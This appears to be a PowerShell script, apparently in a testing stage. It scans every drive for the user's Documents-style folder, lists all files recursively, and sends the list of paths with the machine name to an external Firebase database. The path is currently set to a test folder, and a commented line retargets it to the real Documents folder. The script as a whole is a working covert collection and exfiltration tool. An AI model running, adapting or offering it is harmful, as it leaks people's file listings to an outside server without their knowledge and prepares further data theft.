# List all documents in every volume that has a path ":\Users\$username\DocumentsTesting"
# It also lists all files in every subdirectory recursively
# Change path to virtually anything to get files in that path if it exists
# https://devblogs.microsoft.com/scripting/list-files-in-folders-and-subfolders-with-powershell/

# Firebase setup
$firebaseUriBase = 'https://morten1.europe-west1.firebasedatabase.app/'
$machineName = $env:COMPUTERNAME
$timestamp = Get-Date -Format "yyyyMMddTHHmmss"

# Get all volumes
$volumes = Get-Volume

# Get username
$username = (whoami | Split-Path -Leaf)

# Array to store file paths
$filePaths = @()

# Loop through each volume
# https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_foreach?view=powershell-7.4
foreach ($volume in $volumes) {
    # Check if the volume has a drive letter
    if ($volume.DriveLetter) {
        # Construct the path
	# Uncomment to get all documents
        # $path = $volume.DriveLetter + ":\Users\$username\Documents"
	
	# Get documents for testing
	$path = $volume.DriveLetter + ":\Users\$username\DocumentsTesting"

        # Check if the path exists
        if (Test-Path $path) {
            # Get all files in the path recursively
            $files = Get-ChildItem -Recurse -Path $path

            # Loop through each file
            foreach ($file in $files) {
                $filePaths += $file.FullName
            }
        }
    }
}

# Send data to firebase
$jsonData = $filePaths | ConvertTo-Json

$firebaseUri = $firebaseUriBase + "machines/$machineName/$timestamp/files.json"

$response = Invoke-RestMethod -Uri $firebaseUri -Method Put -ContentType "application/json" -Body $jsonData

Write-Output $response
